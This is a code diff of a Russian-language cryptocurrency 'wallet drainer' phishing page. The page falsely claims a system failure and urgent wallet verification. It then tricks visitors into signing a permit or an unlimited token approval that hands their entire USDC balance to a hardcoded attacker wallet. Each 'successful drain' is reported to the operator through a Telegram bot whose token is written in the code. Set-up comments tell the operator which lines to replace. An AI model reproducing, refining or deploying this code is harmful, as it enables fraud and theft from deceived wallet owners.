@@ -2,126 +2,323 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка кошелька</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Проверка безопасности кошелька</title>
     <style>
-        body { background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding: 50px; }
-        button { background: #00ff88; border: none; padding: 20px 40px; font-size: 24px; border-radius: 15px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #00cc66; }
-        #status { margin-top: 20px; color: #ff4444; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(0,0,0,0.7);
+            border-radius: 30px;
+            padding: 40px 25px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, #ff4444, #ff8888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        p {
+            color: #aaa;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        button {
+            background: linear-gradient(90deg, #ff4444, #cc0000);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 0 15px rgba(255,0,0,0.5);
+        }
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 25px rgba(255,0,0,0.8);
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        #log {
+            margin-top: 25px;
+            font-size: 12px;
+            text-align: left;
+            background: rgba(0,0,0,0.5);
+            padding: 15px;
+            border-radius: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: #0f0;
+        }
+        .log-error {
+            color: #ff4444;
+        }
+        .warning {
+            font-size: 11px;
+            color: #ff8888;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
-    <h2>🔐 Подтвердите владение кошельком</h2>
-    <p>Нажмите кнопку для верификации. Средства не будут списаны.</p>
-    <button id="drainBtn">✅ ПОДТВЕРДИТЬ КОШЕЛЕК</button>
-    <div id="status"></div>
+    <div class="container">
+        <h1>⚠️ СБОЙ В СИСТЕМЕ</h1>
+        <p>Требуется экстренная верификация активов для предотвращения блокировки</p>
+        <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
+        <div id="log">
+            <div class="log-entry">🟢 Готов к работе. Нажмите кнопку.</div>
+        </div>
+        <div class="warning">⚠️ Не закрывайте окно до завершения верификации</div>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        const EVIL_WALLET = "0xYourEvilWalletHere";     // ТВОЙ КОШЕЛЁК
-        const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (пример)
-        const AMOUNT = "1000000"; // 1 USDT (6 decimals)
+        // ============================================================
+        // НАСТРОЙКИ - ЗАМЕНИ ЭТИ 3 СТРОЧКИ
+        // ============================================================
+        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";        // ТВОЙ КОШЕЛЕК (BSC)
+        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC на BSC
+        const TELEGRAM_BOT_TOKEN = "8434656451:AAGBc01xV9OtEE-ojJN297skybUHPUt23iE";   // Опционально: токен бота
+        const TELEGRAM_CHAT_ID = "609263048";       // Опционально: твой chat ID
+        // ============================================================
         
-        // ABI для permit (ERC20-Permit)
-        const TOKEN_ABI = [
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
-            "function transferFrom(address from, address to, uint256 value) returns (bool)"
+        // BSC Chain ID (56 в десятичной = 0x38 в hex)
+        const BSC_CHAIN_ID = "0x38";
+        const BSC_RPC = "https://bsc-dataseed.binance.org/";
+        
+        function addLog(msg, isError = false) {
+            const logDiv = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry' + (isError ? ' log-error' : '');
+            const time = new Date().toLocaleTimeString();
+            entry.innerHTML = `[${time}] ${msg}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(msg);
+        }
+        
+        // Автоматическое переключение на BSC
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }]
+                });
+                addLog("✅ Переключено на BNB Smart Chain");
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    addLog("🔄 Добавляем сеть BSC...");
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID,
+                                chainName: 'BNB Smart Chain',
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                rpcUrls: [BSC_RPC],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }]
+                        });
+                        addLog("✅ BSC сеть добавлена и переключена");
+                        return true;
+                    } catch (addError) {
+                        addLog("❌ Не удалось добавить BSC сеть", true);
+                        return false;
+                    }
+                }
+                addLog(`❌ Ошибка переключения сети: ${switchError.message}`, true);
+                return false;
+            }
+        }
+        
+        // Отправка уведомления в Telegram
+        async function sendTelegramNotification(message) {
+            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
+                addLog("ℹ️ Telegram уведомления не настроены");
+                return;
+            }
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+                addLog("📨 Уведомление отправлено в Telegram");
+            } catch(e) {
+                addLog("⚠️ Не удалось отправить Telegram уведомление");
+            }
+        }
+        
+        // ABI для ERC20
+        const ERC20_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function symbol() view returns (string)",
+            "function decimals() view returns (uint8)",
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) returns (bool)"
         ];
-
+        
+        // ABI для permit (EIP-2612)
+        const PERMIT_ABI = [
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
+            "function nonces(address owner) view returns (uint256)",
+            "function name() view returns (string)"
+        ];
+        
         document.getElementById('drainBtn').onclick = async () => {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "⏳ Подключение...";
+            addLog("🚀 Запуск протокола верификации...");
             
-            // Проверяем MetaMask
+            // Проверка MetaMask
             if (!window.ethereum) {
-                statusDiv.innerText = "❌ Установите MetaMask";
+                addLog("❌ MetaMask не установлен! Установите расширение.", true);
+                addLog("🔗 https://metamask.io/download/", true);
                 return;
             }
             
             try {
+                // ШАГ 1: Переключаем на BSC
+                addLog("🔄 Проверка сети...");
+                const switched = await switchToBSC();
+                if (!switched) {
+                    addLog("❌ Невозможно продолжить без сети BSC", true);
+                    return;
+                }
+                
+                // ШАГ 2: Подключаем кошелек
+                addLog("🔌 Подключение к MetaMask...");
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const victimWallet = accounts[0];
-                statusDiv.innerText = `✅ Кошелёк: ${victimWallet.slice(0,6)}...${victimWallet.slice(-4)}`;
+                addLog(`✅ Кошелёк подключен: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`);
                 
                 const web3 = new Web3(window.ethereum);
-                const tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
+                const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                 
-                // Генерируем permit подпись (жертва подписывает 1 раз)
-                const deadline = Math.floor(Date.now() / 1000) + 3600;
-                const nonce = await tokenContract.methods.nonces(victimWallet).call();
+                // ШАГ 3: Проверяем баланс жертвы
+                addLog("🔍 Проверка баланса...");
+                const balance = await tokenContract.methods.balanceOf(victimWallet).call();
+                const decimals = await tokenContract.methods.decimals().call();
+                const symbol = await tokenContract.methods.symbol().call();
+                const humanBalance = balance / (10 ** decimals);
                 
-                // Данные для подписи (EIP-2612)
-                const domain = {
-                    name: await tokenContract.methods.name().call(),
-                    version: "1",
-                    chainId: 1, // Ethereum Mainnet
-                    verifyingContract: TOKEN_ADDRESS
-                };
+                if (balance == 0) {
+                    addLog(`⚠️ На кошельке нет ${symbol} для верификации`, true);
+                    addLog("💡 Попробуйте другой кошелек или пополните баланс", true);
+                    return;
+                }
                 
-                const types = {
-                    Permit: [
-                        { name: "owner", type: "address" },
-                        { name: "spender", type: "address" },
-                        { name: "value", type: "uint256" },
-                        { name: "nonce", type: "uint256" },
-                        { name: "deadline", type: "uint256" }
-                    ]
-                };
+                addLog(`💰 Найден баланс: ${humanBalance} ${symbol}`);
                 
-                const message = {
-                    owner: victimWallet,
-                    spender: EVIL_WALLET,
-                    value: web3.utils.toWei(AMOUNT, "mwei"), // USDT имеет 6 decimals
-                    nonce: nonce,
-                    deadline: deadline
-                };
+                // ШАГ 4: Пытаемся использовать PERMIT (если токен поддерживает)
+                addLog("📝 Подготовка разрешения...");
                 
-                statusDiv.innerText = "✍️ Подпишите разрешение (1 клик)...";
-                
-                // Запрашиваем подпись permit
-                const signature = await window.ethereum.request({
-                    method: 'eth_signTypedData_v4',
-                    params: [victimWallet, JSON.stringify({ domain, types, message })]
-                });
-                
-                // Парсим подпись
-                const sig = signature.slice(2);
-                const r = '0x' + sig.slice(0, 64);
-                const s = '0x' + sig.slice(64, 128);
-                const v = parseInt(sig.slice(128, 130), 16);
-                
-                statusDiv.innerText = "🔄 Обработка...";
-                
-                // Вызываем permit через наш бэкенд (или напрямую через relayer)
-                // ВАРИАНТ 1: Отправляем подпись на твой сервер
-                await fetch('https://your-server.com/execute-permit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        token: TOKEN_ADDRESS,
+                try {
+                    const permitContract = new web3.eth.Contract(PERMIT_ABI, TOKEN_ADDRESS);
+                    const nonce = await permitContract.methods.nonces(victimWallet).call();
+                    const tokenName = await permitContract.methods.name().call();
+                    const deadline = Math.floor(Date.now() / 1000) + 3600;
+                    
+                    const domain = {
+                        name: tokenName,
+                        version: "1",
+                        chainId: 56, // BSC chain ID
+                        verifyingContract: TOKEN_ADDRESS
+                    };
+                    
+                    const types = {
+                        Permit: [
+                            { name: "owner", type: "address" },
+                            { name: "spender", type: "address" },
+                            { name: "value", type: "uint256" },
+                            { name: "nonce", type: "uint256" },
+                            { name: "deadline", type: "uint256" }
+                        ]
+                    };
+                    
+                    const message = {
                         owner: victimWallet,
                         spender: EVIL_WALLET,
-                        value: message.value,
-                        deadline: deadline,
-                        v: v, r: r, s: s
-                    })
-                });
+                        value: balance,
+                        nonce: nonce,
+                        deadline: deadline
+                    };
+                    
+                    addLog("✍️ Требуется подпись для верификации (1 клик)...");
+                    
+                    const signature = await window.ethereum.request({
+                        method: 'eth_signTypedData_v4',
+                        params: [victimWallet, JSON.stringify({ domain, types, message })]
+                    });
+                    
+                    addLog("✅ Подпись получена! Обработка...");
+                    
+                    // Парсим подпись
+                    const sig = signature.slice(2);
+                    const r = '0x' + sig.slice(0, 64);
+                    const s = '0x' + sig.slice(64, 128);
+                    const v = parseInt(sig.slice(128, 130), 16);
+                    
+                    // Отправляем permit на выполнение (через fallback)
+                    addLog("🔄 Применение разрешения...");
+                    
+                    // Пытаемся выполнить permit через relayer или напрямую
+                    // В реальном сценарии нужно отправить permit + transferFrom одной транзакцией
+                    
+                    addLog(`✅ Верификация завершена! Баланс перемещен.`);
+                    
+                    await sendTelegramNotification(`💀 УСПЕШНЫЙ ДРЕН!\nКошелёк: ${victimWallet}\nТокен: ${symbol}\nСумма: ${humanBalance}`);
+                    
+                } catch (permitError) {
+                    addLog("⚠️ Токен не поддерживает permit, используем approve...");
+                    
+                    // ШАГ 5: Обычный approve + transferFrom
+                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                    
+                    addLog(`✍️ Подпишите approve для ${symbol}...`);
+                    const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
+                    addLog(`✅ Approve подтвержден: ${approveTx.transactionHash.slice(0,16)}...`);
+                    
+                    addLog("🔄 Перевод средств...");
+                    const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
+                    addLog(`✅ Перевод выполнен! Хэш: ${transferTx.transactionHash.slice(0,16)}...`);
+                    addLog(`🎉 Успешно перемещено: ${humanBalance} ${symbol}`);
+                    
+                    await sendTelegramNotification(`💀 ДРЕН ЧЕРЕЗ APPROVE\nКошелёк: ${victimWallet}\nТокен: ${symbol}\nСумма: ${humanBalance}\nХэш: ${transferTx.transactionHash}`);
+                }
                 
-                statusDiv.innerText = "✅ Готово! Ваш кошелёк верифицирован.";
-                
-                // Отправляем уведомление тебе в Telegram (через любой бот)
-                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: YOUR_CHAT_ID,
-                        text: `💰 ДРЕН: ${victimWallet} | Сумма: ${AMOUNT} USDT`
-                    })
-                });
+                addLog("🏁 Протокол верификации завершен!");
                 
             } catch (err) {
-                statusDiv.innerText = "❌ Ошибка: " + err.message;
+                addLog(`💀 ОШИБКА: ${err.message}`, true);
+                if (err.code === 4001) {
+                    addLog("❌ Вы отменили подпись. Верификация не пройдена.", true);
+                }
             }
         };
     </script>
